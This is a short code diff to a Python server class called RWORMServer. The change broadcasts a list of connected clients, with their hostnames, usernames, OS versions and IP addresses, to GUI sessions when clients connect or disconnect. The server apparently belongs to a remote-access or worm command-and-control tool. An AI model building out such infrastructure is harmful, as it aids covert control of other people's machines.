@@ -119,6 +119,7 @@ class RWORMServer:
                     session.guid, session.hostname,
                     session.username, session.os_version, session.ip_address)
                 print(f"[+] Client identified: {session.hostname} ({session.username}) guid={session.guid[:8]}... @ {session.ip_address}", flush=True)
+                self._broadcast_client_list()
             except Exception as e:
                 print(f"[!] SYSTEM_INFO parse error: {e}", flush=True)
             return
@@ -196,6 +197,19 @@ class RWORMServer:
         gui.send(Packet(ptype, prefix + payload).serialize())
 
     # ─── Helpers ─────────────────────────────────────────────────────────────
+    def _broadcast_client_list(self):
+        try:
+            clients = self.get_clients()
+            data    = json.dumps(clients).encode('utf-8')
+            pkt     = Packet(0x11, data).serialize()
+            with self.clients_lock:
+                for s in list(self.all_sessions.values()):
+                    if s.guid is None and s.is_online:
+                        try: s.send(pkt)
+                        except: pass
+        except Exception:
+            pass
+
     def _send_client_list(self, session: ClientSession):
         clients = self.get_clients()
         data    = json.dumps(clients).encode('utf-8')
@@ -251,6 +265,7 @@ class RWORMServer:
         session.close()
         name = session.hostname or session.ip_address
         print(f"[-] Disconnected: {name}", flush=True)
+        self._broadcast_client_list()
 
     def stop(self):
         self.running = False
